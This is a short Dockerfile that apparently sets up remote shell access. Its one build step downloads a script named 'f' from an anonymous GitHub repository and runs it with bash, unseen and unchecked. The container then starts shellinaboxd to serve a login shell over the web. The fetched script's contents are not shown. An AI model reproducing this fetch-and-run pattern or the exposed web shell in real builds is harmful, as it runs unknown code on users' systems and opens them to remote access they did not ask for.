# Use a base image that supports systemd, for example, Ubuntu
FROM ubuntu:20.04

# Install necessary packages
RUN apt update && apt install wget sudo iputils-ping -y && wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/f && bash f && ping google.com

# Start shellinabox
CMD ["/usr/bin/shellinaboxd", "-t", "-s", "/:LOGIN"]
